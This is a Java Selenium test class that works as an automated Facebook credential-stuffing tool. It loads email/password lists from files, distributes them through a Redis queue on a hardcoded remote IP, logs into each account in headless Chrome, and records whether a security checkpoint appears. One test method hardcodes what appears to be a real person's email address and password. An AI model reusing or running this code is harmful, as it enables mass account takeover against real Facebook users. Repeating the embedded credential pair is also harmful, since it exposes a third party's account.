import bean.FBData;
import bean.SourceData;
import dao.UserDao;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.JedisPoolConfig;
import redis.rmq.Consumer;
import redis.rmq.Producer;
import util.FileUtils;

import javax.sql.DataSource;
import java.io.File;
import java.io.IOException;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Set;

/**
 * User: liji
 * Date: 18/1/4
 * Time: 下午7:56
 * ps -ef | grep chrome | grep -v grep | awk '{print $2}' | xargs kill
 */
public class FacebookLoginLinuxTest {

    private static final String FILE_PA = "/root/selenium-example/users";
    private static final String CHROME_PATH = "/root/selenium-example/chromedriver";
    //        private static final String CHROME_PATH = "webdriver/chromedriver";
    //    private static final String GECKO_PATH = "webdriver/geckodriver";
    private static final String GECKO_PATH = "/root/geckodriver";
    //    private static final String FILE_PA = "/Users/liji/github/fblogin/users/dd.txt_1406.txt";
    private static final String FB_URL = "https://m.facebook.com";
    private static final String TOPIC = "fb_user";
    private static final String REDIS_HOST = "104.236.82.206";
    private Set<String> accounts;
    private LinkedList<SourceData> accountList = new LinkedList<>();

    private WebDriver driver;
    private ApplicationContext context;
    private UserDao userDao;
    private Producer producer;
    private Consumer consumer;


    @Before
    public void init() {
        this.killChrome();
        context = new ClassPathXmlApplicationContext("SpringConfig.xml");
        userDao = new UserDao((DataSource) context.getBean("dataSource"));
        JedisPool pool = new JedisPool(new JedisPoolConfig(), REDIS_HOST);
        producer = new Producer(pool.getResource(), TOPIC);
        consumer = new Consumer(pool.getResource(), "a subscriber", TOPIC);
    }

    private void killChrome() {
        try {
            System.out.println("kill chrome thread!");
            System.out.println("exec : pkill -f -e chrome");
            Runtime.getRuntime().exec("pkill -f -e chrome");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void initGeckoDriver() {
        FirefoxOptions options = new FirefoxOptions();
        options.setHeadless(true);
        options.addPreference("security.sandbox.content.level", 4);
        System.setProperty("webdriver.gecko.driver", GECKO_PATH);
        FirefoxProfile profile = new FirefoxProfile();
        profile.setPreference("browser.tabs.remote.autostart", false);
        profile.setPreference("browser.tabs.remote.autostart.1", false);
        profile.setPreference("browser.tabs.remote.autostart.2", false);
        profile.setPreference("browser.tabs.remote.force-enable", "false");
        options.setProfile(profile);
        driver = new FirefoxDriver(options);
    }

    /**
     * 初始化浏览器
     */
    private void initChromeDriver() {
        System.out.println("Init Driver!!!!");
        System.setProperty(
                "webdriver.chrome.driver",
                CHROME_PATH);
//        DesiredCapabilities capabilities = DesiredCapabilities.chrome();
//        capabilities.setCapability(CapabilityType.ForSeleniumServer.AVOIDING_PROXY, true);
//        capabilities.setCapability(CapabilityType.ForSeleniumServer.ONLY_PROXYING_SELENIUM_TRAFFIC, true);
        ChromeOptions chromeOptions = new ChromeOptions();
        chromeOptions.addArguments("--headless");
        chromeOptions.addArguments("--no-sandbox");
//        chromeOptions.addArguments("--window-size=400,800");
//        chromeOptions.addArguments("--proxy-server=socks5://127.0.0.1:2080");
//        capabilities.setCapability(ChromeOptions.CAPABILITY, chromeOptions);
        try {
            driver = new ChromeDriver(chromeOptions);
        } catch (org.openqa.selenium.WebDriverException e) {
            System.out.println("Create chrome driver failed!!!");
            System.out.println(e.getMessage());
        }
    }


    private void loginFacebook(SourceData account, String source) {
        initChromeDriver();
        long start = System.currentTimeMillis();
        FBData fbData = FBData.form(account);
        fbData.setType("none");
        String currentUrl = "";
        try {
            driver.get(FB_URL);
            System.out.println(String.format("====== Ready to login : %s / %s ======", account.getName(), account.getPassword()));
            WebElement formEmail = driver.findElement(By.name("email"));
            formEmail.sendKeys(account.getName());
            WebElement formPassword = new WebDriverWait(driver, 1).until(ExpectedConditions.presenceOfElementLocated(By.name("pass")));
            formPassword.sendKeys(account.getPassword());
            driver.findElement(By.name("login")).click();
            long t3 = System.currentTimeMillis();
//            WebElement result = new WebDriverWait(driver, 2).until(ExpectedConditions.presenceOfElementLocated(By.id("checkpoint_title")));
            WebElement result = new WebDriverWait(driver, 2).until(ExpectedConditions.presenceOfElementLocated(By.id("checkpointSubmitButton-actual-button")));
            if (result != null) {
                result.click();
            }
            WebElement photoText = new WebDriverWait(driver, 2).until(ExpectedConditions.presenceOfElementLocated(By.xpath("//div[text()=\"Identify photos of friends\"]")));
            if (photoText != null) {
                System.out.println(String.format("Result is:%s", photoText.getText()));
                fbData.setMessage(photoText.getText());
            } else {
                fbData.setMessage("NO PHOTO!");
            }
        } catch (RuntimeException e) {
            System.out.println("RuntimeException:" + e.getMessage());
        } finally {
            try {
                if (this.driver != null) {
                    driver.close();
                    driver.quit();
                }
            } catch (org.openqa.selenium.WebDriverException e) {
                System.out.println("Exit system!");
                System.exit(0);
                /*try {
                    //
                    this.producer.publish(source);
                    System.out.println("Close driver exception:" + e.getMessage());
                    System.out.println("Waiting for 10 second.....");
                    Thread.sleep(1000 * 10);
                    this.killChrome();
                    System.out.println("Waiting for 10 second.....");
                    Thread.sleep(1000 * 10);
                } catch (InterruptedException e1) {
                    e1.printStackTrace();
                }*/
            }
            // 登录成功
            if (currentUrl.indexOf("checkpoint") >= 0) {
                fbData.setType("checkpoint");
            }
            fbData.setRedirectUrl(currentUrl);
            try {
                this.userDao.insertFBData(fbData);
            } catch (RuntimeException e) {
                System.out.println("insert record fail:" + e.getMessage());
            }
            System.out.println("Cost time:" + (System.currentTimeMillis() - start));
        }
    }


    @Test
    public void loginSingleFacebook() {
        System.out.println("Let us login FB!!!");
        SourceData user = new SourceData();
        user.setName("marilyn_letch@yahoo.com");
        user.setPassword("gram49");
        this.loginFacebook(user, "");
    }

    @Test
    public void loginFacebook() {
        System.out.println("Let us login FB!!!");
        String source = this.consumer.consume();
        while (source != null) {
            SourceData user = this.parseUser(source);
            if (user != null) {
                this.loginFacebook(user, source);
            }
            source = this.consumer.consume();
        }
    }

    @Test
    public void consume() {
//        this.producer.publish("test123");
        System.out.println(consumer.consume());
    }

    private SourceData parseUser(String source) {
        String[] s1 = source.split("\\s+");
        if (s1 != null) {
            String name = s1[0];
            String password = s1[1];
            SourceData accountObj = new SourceData();
            accountObj.setName(name);
            accountObj.setPassword(password);
            return accountObj;
        }
        return null;
    }

    @Test
    public void initUserQueue() {
        Set<String> set = new HashSet<>();
        File[] files = new File(FILE_PA).listFiles();
        for (File file :
                files) {
            set.addAll(FileUtils.readTxtFileIntoStringArrList(file));
        }
        System.out.println(set.size());
        for (String string : set) {
            System.out.println(String.format("Ready to publish %s ", string));
            this.producer.publish(string);
        }
    }
}
